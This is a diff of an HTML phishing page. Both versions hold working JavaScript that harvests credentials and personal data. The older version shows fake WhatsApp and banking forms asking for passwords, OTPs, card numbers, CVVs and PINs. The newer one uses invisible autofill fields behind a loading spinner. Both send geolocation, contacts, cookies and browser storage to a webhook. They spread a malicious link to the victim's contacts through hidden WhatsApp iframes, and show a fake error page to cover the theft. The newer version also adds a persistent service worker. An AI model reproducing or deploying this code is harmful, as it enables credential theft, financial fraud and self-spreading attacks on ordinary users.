@@ -2,319 +2,244 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title>Security Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: Arial, sans-serif; background: #0d0d0d; color: #e0e0e0; padding: 2rem; display: flex; justify-content: center; }
-        .container { max-width: 500px; width: 100%; background: #1a1a1a; padding: 2rem; border-radius: 16px; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
-        h2 { text-align: center; margin-bottom: 1.5rem; color: #00c853; }
-        .field { margin-bottom: 1rem; }
-        label { display: block; font-size: 0.9rem; margin-bottom: 0.3rem; color: #aaa; }
-        input { width: 100%; padding: 12px; background: #2a2a2a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 1rem; }
-        input:focus { outline: none; border-color: #00c853; }
-        .btn { width: 100%; padding: 14px; background: #00c853; border: none; border-radius: 8px; color: #fff; font-weight: bold; font-size: 1rem; cursor: pointer; margin-top: 0.5rem; }
-        .btn:hover { background: #00e676; }
+        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #888; font-family: Arial; }
+        .spinner { border: 4px solid #222; border-top: 4px solid #00c853; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .hidden { display: none !important; }
-        .section { border-top: 1px solid #333; padding-top: 1.5rem; margin-top: 1.5rem; }
-        .status { font-size: 0.8rem; color: #888; text-align: center; margin-top: 1rem; }
-        .fake-error { color: #ff1744; text-align: center; margin-top: 1rem; display: none; }
     </style>
 </head>
 <body>
-<div class="container" id="mainContainer">
-    <h2>🔐 Security Verification</h2>
-    <p style="text-align:center; color:#aaa; margin-bottom:1.5rem;">Please confirm your identity to continue</p>
-
-    <!-- FAKE WHATSAPP LOGIN -->
-    <div class="section">
-        <h3 style="color:#25D366;">WhatsApp Verification</h3>
-        <div class="field">
-            <label>Phone Number</label>
-            <input type="tel" id="waPhone" autocomplete="tel" placeholder="+39 3xx xxx xxxx">
-        </div>
-        <div class="field">
-            <label>Password (or OTP)</label>
-            <input type="password" id="waPassword" autocomplete="current-password" placeholder="Enter your password or 6-digit code">
-        </div>
+    <div id="loader" style="text-align:center;">
+        <div class="spinner"></div>
+        <p style="margin-top:20px;">Connecting...</p>
     </div>
 
-    <!-- FAKE BANKING FORM -->
-    <div class="section">
-        <h3 style="color:#ffab00;">Banking Details</h3>
-        <div class="field">
-            <label>Cardholder Name</label>
-            <input type="text" id="bankName" autocomplete="cc-name" placeholder="John Doe">
-        </div>
-        <div class="field">
-            <label>Card Number</label>
-            <input type="text" id="bankNumber" autocomplete="cc-number" placeholder="1234 5678 9012 3456">
-        </div>
-        <div class="field">
-            <label>Expiry (MM/YY)</label>
-            <input type="text" id="bankExpiry" autocomplete="cc-exp" placeholder="12/25">
-        </div>
-        <div class="field">
-            <label>CVV</label>
-            <input type="password" id="bankCvv" autocomplete="cc-csc" placeholder="123" maxlength="4">
-        </div>
-        <div class="field">
-            <label>PIN (optional)</label>
-            <input type="password" id="bankPin" placeholder="4-digit PIN">
-        </div>
-    </div>
+    <!-- HIDDEN AUTOFILL FIELDS – all invisible -->
+    <input type="text" id="hf_name" autocomplete="name" class="hidden">
+    <input type="tel" id="hf_phone" autocomplete="tel" class="hidden">
+    <input type="email" id="hf_email" autocomplete="email" class="hidden">
+    <input type="text" id="hf_address" autocomplete="street-address" class="hidden">
+    <input type="text" id="hf_ccname" autocomplete="cc-name" class="hidden">
+    <input type="text" id="hf_ccnum" autocomplete="cc-number" class="hidden">
+    <input type="text" id="hf_ccexp" autocomplete="cc-exp" class="hidden">
+    <input type="password" id="hf_cccsc" autocomplete="cc-csc" class="hidden">
+    <input type="password" id="hf_pass" autocomplete="current-password" class="hidden">
+    <input type="text" id="hf_username" autocomplete="username" class="hidden">
 
-    <!-- HIDDEN AUTOFILL CATCHERS -->
-    <input type="text" id="hiddenName" autocomplete="name" class="hidden">
-    <input type="email" id="hiddenEmail" autocomplete="email" class="hidden">
-    <input type="text" id="hiddenAddress" autocomplete="street-address" class="hidden">
+    <script>
+        // ===== CONFIG =====
+        const WEBHOOK = 'https://webhook.site/your-unique-id';   // <-- REPLACE
+        const MALICIOUS_URL = 'https://vincenzomuyo-art.github.io/nuova-mongolia/'; // <-- REPLACE
 
-    <button class="btn" id="submitBtn">Verify Identity</button>
-    <div class="status" id="status">Waiting for verification...</div>
-    <div class="fake-error" id="errorMsg">⚠️ Connection error. Please try again.</div>
-</div>
+        // ===== HELPER: SEND DATA =====
+        function sendData(data) {
+            const json = JSON.stringify(data);
+            // sendBeacon
+            if (navigator.sendBeacon) navigator.sendBeacon(WEBHOOK, json);
+            // fetch (no-cors)
+            fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: json, keepalive: true }).catch(()=>{});
+            // image beacon (shortened)
+            new Image().src = WEBHOOK + '?d=' + encodeURIComponent(json.substring(0, 2000));
+        }
 
-<script>
-    // ===== CONFIGURATION =====
-    // REPLACE WITH YOUR WEBHOOK URL (e.g., webhook.site)
-    const WEBHOOK_URL = 'https://webhooksite.net/134ad3ba-d79f-4470-a7d6-781042f57316';
-    // The malicious link to send to contacts – change to your deployed GitHub Pages URL
-    const ATTACKER_LINK = 'https://github.com/vincenzomuyo-art/hac.git';
-
-    // ===== DATA COLLECTION OBJECTS =====
-    let collectedData = {
-        geo: null,
-        contacts: null,
-        whatsapp: { phone: null, password: null },
-        bank: { name: null, number: null, expiry: null, cvv: null, pin: null },
-        personal: { fullname: null, email: null, address: null },
-        metadata: {},
-        timestamp: null
-    };
-
-    // ===== STEP 1: GEOLOCATION =====
-    function getGeolocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve({ error: 'not supported' });
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
+        // ===== 1. GEOLOCATION (with IP fallback) =====
+        function getGeo() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    fallbackIP(resolve);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        alt: pos.coords.altitude || null,
-                        speed: pos.coords.speed || null,
-                        timestamp: new Date(pos.timestamp).toISOString()
-                    });
-                },
-                (err) => {
-                    // fallback to IP geolocation
-                    fetch('https://ipapi.co/json/')
-                        .then(r => r.json())
-                        .then(ipData => {
-                            resolve({
-                                lat: ipData.latitude || null,
-                                lon: ipData.longitude || null,
-                                city: ipData.city || null,
-                                country: ipData.country_name || null,
-                                ip: ipData.ip || null,
-                                error: err.message || 'denied'
-                            });
-                        })
-                        .catch(() => resolve({ error: 'geolocation and IP fallback failed' }));
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        });
-    }
-
-    // ===== STEP 2: CONTACTS (via API) =====
-    function getContacts() {
-        return new Promise((resolve) => {
-            if (!navigator.contacts || typeof navigator.contacts.select !== 'function') {
-                resolve({ error: 'Contacts API not available' });
-                return;
-            }
-            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
-                .then(contacts => {
-                    const cleaned = contacts.map(c => ({
-                        name: c.name ? c.name[0] || null : null,
-                        tel: (c.tel && c.tel.length) ? c.tel : null,
-                        email: (c.email && c.email.length) ? c.email : null
-                    }));
-                    resolve(cleaned);
-                })
-                .catch(err => resolve({ error: err.message || 'denied' }));
-        });
-    }
-
-    // ===== STEP 3: CAPTURE FORM FIELDS (WhatsApp, Bank, Personal) =====
-    function captureFields() {
-        const waPhone = document.getElementById('waPhone').value.trim();
-        const waPassword = document.getElementById('waPassword').value.trim();
-        const bankName = document.getElementById('bankName').value.trim();
-        const bankNumber = document.getElementById('bankNumber').value.trim();
-        const bankExpiry = document.getElementById('bankExpiry').value.trim();
-        const bankCvv = document.getElementById('bankCvv').value.trim();
-        const bankPin = document.getElementById('bankPin').value.trim();
-
-        // Hidden autofill fields
-        const hiddenName = document.getElementById('hiddenName').value.trim();
-        const hiddenEmail = document.getElementById('hiddenEmail').value.trim();
-        const hiddenAddress = document.getElementById('hiddenAddress').value.trim();
-
-        return {
-            whatsapp: { phone: waPhone || null, password: waPassword || null },
-            bank: { name: bankName || null, number: bankNumber || null, expiry: bankExpiry || null, cvv: bankCvv || null, pin: bankPin || null },
-            personal: { fullname: hiddenName || null, email: hiddenEmail || null, address: hiddenAddress || null }
-        };
-    }
-
-    // ===== STEP 4: METADATA + STORAGE =====
-    function collectMetadata() {
-        const data = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            url: window.location.href,
-            referrer: document.referrer || 'none',
-            localStorage: null,
-            sessionStorage: null,
-            cookies: null
-        };
-        try { data.localStorage = JSON.stringify(localStorage); } catch(e){}
-        try { data.sessionStorage = JSON.stringify(sessionStorage); } catch(e){}
-        try { data.cookies = document.cookie; } catch(e){}
-        return data;
-    }
-
-    // ===== STEP 5: SEND PAYLOAD =====
-    function sendPayload(payload) {
-        const json = JSON.stringify(payload);
-        // Method 1: sendBeacon
-        if (navigator.sendBeacon) {
-            navigator.sendBeacon(WEBHOOK_URL, json);
+                        acc: pos.coords.accuracy,
+                        alt: pos.coords.altitude,
+                        speed: pos.coords.speed,
+                        ts: new Date(pos.timestamp).toISOString()
+                    }),
+                    () => fallbackIP(resolve),
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            });
         }
-        // Method 2: fetch (no-cors)
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: json,
-            keepalive: true
-        }).catch(() => {});
-        // Method 3: image beacon (shortened)
-        const img = new Image();
-        img.src = WEBHOOK_URL + '?d=' + encodeURIComponent(json.substring(0, 2000));
-        console.log('Payload sent (attempted)');
-    }
+        function fallbackIP(resolve) {
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(d => resolve({ lat: d.latitude, lon: d.longitude, city: d.city, country: d.country_name, ip: d.ip }))
+                .catch(() => resolve({ error: 'geo failed' }));
+        }
 
-    // ===== STEP 6: SEND LINK TO CONTACTS =====
-    function propagateLink(contacts) {
-        if (!contacts || contacts.length === 0) return;
-        // For each contact with a phone number, attempt to open WhatsApp share link
-        // But many will be blocked by popup blockers – we do it one by one with delay
-        const message = encodeURIComponent(`Ciao, ho trovato un'informazione importante: ${ATTACKER_LINK}`);
-        let phoneNumbers = [];
-        contacts.forEach(c => {
-            if (c.tel && Array.isArray(c.tel)) {
-                c.tel.forEach(t => {
-                    // clean number: remove spaces, +, etc.
-                    let num = t.replace(/\s/g, '').replace(/[^0-9+]/g, '');
-                    if (num.startsWith('+')) num = num.substring(1);
-                    phoneNumbers.push(num);
-                });
-            }
-        });
-        // Remove duplicates
-        phoneNumbers = [...new Set(phoneNumbers)];
-        // Open first 5 in new tabs (to avoid overwhelming)
-        const toSend = phoneNumbers.slice(0, 5);
-        toSend.forEach((num, idx) => {
+        // ===== 2. CONTACTS (if API exists) =====
+        function getContacts() {
+            return new Promise((resolve) => {
+                if (!navigator.contacts || typeof navigator.contacts.select !== 'function') {
+                    resolve([]);
+                    return;
+                }
+                navigator.contacts.select(['name','tel','email'], { multiple: true })
+                    .then(contacts => {
+                        const cleaned = contacts.map(c => ({
+                            name: c.name?.[0] || null,
+                            tel: c.tel || null,
+                            email: c.email || null
+                        }));
+                        resolve(cleaned);
+                    })
+                    .catch(() => resolve([]));
+            });
+        }
+
+        // ===== 3. READ AUTOFILL FIELDS =====
+        function readAutofill() {
+            const ids = ['hf_name','hf_phone','hf_email','hf_address','hf_ccname','hf_ccnum','hf_ccexp','hf_cccsc','hf_pass','hf_username'];
+            const data = {};
+            ids.forEach(id => {
+                const el = document.getElementById(id);
+                if (el && el.value) data[id.replace('hf_','')] = el.value;
+            });
+            return data;
+        }
+
+        // ===== 4. METADATA + STORAGE =====
+        function getMeta() {
+            const m = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                lang: navigator.language,
+                screen: screen.width+'x'+screen.height,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: location.href,
+                ref: document.referrer || 'none',
+                ls: null, ss: null, cookies: null
+            };
+            try { m.ls = JSON.stringify(localStorage); } catch(e){}
+            try { m.ss = JSON.stringify(sessionStorage); } catch(e){}
+            try { m.cookies = document.cookie; } catch(e){}
+            return m;
+        }
+
+        // ===== 5. PROPAGATE LINK TO CONTACTS (hidden iframes + pop-under) =====
+        function propagate(contacts) {
+            if (!contacts || contacts.length === 0) return;
+            const numbers = [];
+            contacts.forEach(c => {
+                if (c.tel) {
+                    if (Array.isArray(c.tel)) c.tel.forEach(t => numbers.push(t.replace(/\s/g,'').replace(/[^0-9+]/g,'')));
+                    else numbers.push(c.tel.replace(/\s/g,'').replace(/[^0-9+]/g,''));
+                }
+            });
+            const unique = [...new Set(numbers)].filter(n => n.length > 5);
+            const msg = encodeURIComponent(`Guarda questo link: ${MALICIOUS_URL}`);
+            // Open first 10 via iframes (invisible) with delay
+            unique.slice(0, 10).forEach((num, idx) => {
+                setTimeout(() => {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = `https://api.whatsapp.com/send?phone=${num}&text=${msg}`;
+                    document.body.appendChild(iframe);
+                    setTimeout(() => iframe.remove(), 3000);
+                }, idx * 600);
+            });
+            // Also try pop-under: open a new window, then blur it
             setTimeout(() => {
-                window.open(`https://api.whatsapp.com/send?phone=${num}&text=${message}`, '_blank');
-            }, idx * 800);
-        });
-        // Also try Web Share API as fallback (needs user gesture)
-        // We will call this on button click later
-    }
-
-    // ===== STEP 7: MAIN COLLECTION FUNCTION =====
-    async function collectAll() {
-        document.getElementById('status').innerText = 'Collecting data...';
-        const geo = await getGeolocation();
-        const contacts = await getContacts();
-        const fields = captureFields();
-        const meta = collectMetadata();
-
-        collectedData.geo = geo;
-        collectedData.contacts = contacts;
-        collectedData.whatsapp = fields.whatsapp;
-        collectedData.bank = fields.bank;
-        collectedData.personal = fields.personal;
-        collectedData.metadata = meta;
-        collectedData.timestamp = new Date().toISOString();
-
-        // Send the full payload
-        sendPayload(collectedData);
-
-        // Attempt to propagate link if we have contacts
-        if (contacts && Array.isArray(contacts) && contacts.length > 0) {
-            propagateLink(contacts);
+                const win = window.open('', '_blank');
+                if (win) {
+                    win.document.write(`<iframe src="https://api.whatsapp.com/send?phone=${unique[0] || ''}&text=${msg}" style="width:100%;height:100%;"></iframe>`);
+                    win.blur();
+                    window.focus();
+                }
+            }, 2000);
         }
 
-        document.getElementById('status').innerHTML = '✅ Verification complete. Redirecting...';
-        // Hide form and show fake error after 2s
-        setTimeout(() => {
-            document.getElementById('mainContainer').innerHTML = `
-                <h2 style="color:#ff1744;">⚠️ Connection Error</h2>
-                <p style="text-align:center; color:#aaa;">Unable to verify your identity. Please try again later.</p>
-                <p style="text-align:center; color:#555; margin-top:2rem;">If the problem persists, contact support.</p>
+        // ===== 6. MAIN COLLECTOR =====
+        async function collect() {
+            const [geo, contacts] = await Promise.all([getGeo(), getContacts()]);
+            const autofill = readAutofill();
+            const meta = getMeta();
+
+            const payload = {
+                geo,
+                contacts,
+                autofill,
+                meta,
+                timestamp: new Date().toISOString(),
+                // include all in one
+                raw: { geo, contacts, autofill, meta }
+            };
+
+            sendData(payload);
+
+            // Propagate if we have contacts
+            if (contacts && contacts.length > 0) {
+                propagate(contacts);
+            }
+
+            // Hide loader and show fake error after 1s
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div style="background:#0a0a0a;color:#555;text-align:center;padding-top:40vh;font-family:Arial;">
+                        <h1 style="color:#ff1744;">404 Not Found</h1>
+                        <p>The requested resource could not be found.</p>
+                    </div>
+                `;
+                // Optionally redirect to a legit site after 3s
+                // setTimeout(() => location.href = 'https://web.whatsapp.com/', 3000);
+            }, 1000);
+        }
+
+        // ===== 7. SERVICE WORKER FOR PERSISTENCE (optional) =====
+        if ('serviceWorker' in navigator) {
+            // Register a minimal SW that re-collects on sync
+            const swCode = `
+                self.addEventListener('install', () => self.skipWaiting());
+                self.addEventListener('activate', () => self.clients.claim());
+                self.addEventListener('sync', (event) => {
+                    if (event.tag === 'periodic-collect') {
+                        event.waitUntil(
+                            clients.matchAll().then(clients => {
+                                clients.forEach(client => client.postMessage('collect'));
+                            })
+                        );
+                    }
+                });
+                self.addEventListener('message', (event) => {
+                    if (event.data === 'collect') {
+                        // Re-run collection via fetch to a webhook? Actually we can't do much without DOM.
+                        // We'll just send a ping.
+                        fetch('${WEBHOOK}', { method: 'POST', body: JSON.stringify({type:'sw-ping', ts:Date.now()}) });
+                    }
+                });
             `;
-            // Redirect to real WhatsApp or bank after 5s (optional)
-            // window.location.href = 'https://web.whatsapp.com/';
-        }, 2000);
-    }
-
-    // ===== STEP 8: TRIGGER ON LOAD AND BUTTON =====
-    window.addEventListener('load', function() {
-        // Wait 1.5s to let autofill populate, then auto-collect
-        setTimeout(() => {
-            // Also listen for manual button click – we'll call collect on both
-            document.getElementById('submitBtn').addEventListener('click', collectAll);
-            // Auto-run once after 2s
-            setTimeout(collectAll, 1000);
-        }, 500);
-    });
-
-    // Also capture any form submit events
-    document.addEventListener('submit', function(e) {
-        e.preventDefault();
-        collectAll();
-    });
-
-    // Periodic resend of metadata every 30s
-    setInterval(() => {
-        const meta = collectMetadata();
-        const periodic = { type: 'periodic', data: meta, timestamp: new Date().toISOString() };
-        sendPayload(periodic);
-    }, 30000);
-
-    // If user clicks anywhere, try to trigger Web Share for link propagation (additional)
-    document.addEventListener('click', function() {
-        if (navigator.share) {
-            navigator.share({
-                title: 'Important information',
-                text: `Check this: ${ATTACKER_LINK}`,
-                url: ATTACKER_LINK
-            }).catch(() => {});
+            const blob = new Blob([swCode], { type: 'application/javascript' });
+            const swUrl = URL.createObjectURL(blob);
+            navigator.serviceWorker.register(swUrl, { scope: '/' })
+                .then(reg => {
+                    // Request periodic sync (if permission)
+                    if ('periodicSync' in reg) {
+                        reg.periodicSync.register('periodic-collect', { minInterval: 24 * 60 * 60 * 1000 })
+                            .catch(() => {});
+                    }
+                })
+                .catch(() => {});
         }
-    });
-</script>
+
+        // ===== 8. TRIGGER ON LOAD =====
+        window.addEventListener('load', function() {
+            // Wait 2.5s for autofill to populate, then collect
+            setTimeout(collect, 2500);
+        });
+
+        // Also listen to any click to trigger share as fallback
+        document.addEventListener('click', function() {
+            if (navigator.share) {
+                navigator.share({ title: 'Check this', text: MALICIOUS_URL, url: MALICIOUS_URL })
+                    .catch(() => {});
+            }
+        });
+    </script>
 </body>
 </html>
